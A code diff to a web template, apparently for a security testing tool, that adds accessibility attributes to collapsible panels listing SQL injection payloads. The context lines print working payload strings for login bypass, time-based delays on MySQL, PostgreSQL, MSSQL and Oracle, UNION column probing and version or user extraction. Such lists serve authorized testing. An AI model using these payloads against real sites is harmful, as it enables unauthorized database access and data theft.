@@ -251,11 +251,13 @@
                     
                     <!-- Error-Based Payloads -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors" 
+                                aria-expanded="true" 
+                                aria-controls="error-based-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">⚠️ Error-Based SQL Injection</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="error-based-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' OR '1'='1|' OR '1'='1'--|' OR '1'='1' /*|\" OR \"1\"=\"1|\", OR \"1\"=\"1\"--|') OR ('1'='1|\") OR (\"1\"=\"1|' AND '1'='2|admin'--|admin' #|admin'/*|' OR 'x'='x|') OR ('x')=('x|1' AND '1'='1|1' AND '1'='2|' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -274,11 +276,13 @@
                     
                     <!-- Time-Based MySQL -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="time-mysql-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">⏰ Time-Based SQL Injection - MySQL</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="time-mysql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' AND SLEEP(5)--|1' AND SLEEP(5)--|' OR SLEEP(5)--|1 AND SLEEP(5)|') AND SLEEP(5)--|' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -297,11 +301,13 @@
                     
                     <!-- Time-Based PostgreSQL -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="time-postgresql-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">⏰ Time-Based SQL Injection - PostgreSQL</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="time-postgresql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' AND pg_sleep(5)--|1' AND pg_sleep(5)--|' OR pg_sleep(5)--|') AND pg_sleep(5)--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -320,11 +326,13 @@
                     
                     <!-- Time-Based MSSQL -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="time-mssql-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">⏰ Time-Based SQL Injection - MSSQL</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="time-mssql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "'; WAITFOR DELAY '00:00:05'--|1'; WAITFOR DELAY '00:00:05'--|' WAITFOR DELAY '00:00:05'--|') WAITFOR DELAY '00:00:05'--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -343,11 +351,13 @@
                     
                     <!-- Time-Based Oracle -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="time-oracle-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">⏰ Time-Based SQL Injection - Oracle</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="time-oracle-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' AND DBMS_LOCK.SLEEP(5)--|1' AND DBMS_LOCK.SLEEP(5)--|') AND DBMS_LOCK.SLEEP(5)--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -366,11 +376,13 @@
                     
                     <!-- Union-Based Payloads -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="union-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">🔗 Union-Based SQL Injection</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="union-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--|' UNION SELECT NULL,NULL,NULL,NULL--|' UNION ALL SELECT NULL--|' UNION ALL SELECT NULL,NULL--|' ORDER BY 1--|' ORDER BY 2--|' ORDER BY 3--|' ORDER BY 10--|' UNION SELECT @@version--|' UNION SELECT database()--|' UNION SELECT user()--"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
@@ -389,11 +401,13 @@
                     
                     <!-- Boolean-Based Payloads -->
                     <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
-                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
+                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
+                                aria-expanded="true"
+                                aria-controls="boolean-payloads">
                             <h4 class="text-lg font-semibold text-gray-900 dark:text-white">🔘 Boolean-Based SQL Injection</h4>
                             <span class="collapse-icon text-gray-500">▼</span>
                         </button>
-                        <div class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
+                        <div id="boolean-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                             {% for payload in "' AND '1'='1|' AND '1'='2|' AND 'a'='a|' AND 'a'='b|1' AND '1'='1|1' AND '1'='2|') AND ('1'='1|') AND ('1'='2"%}
                             <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                 <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
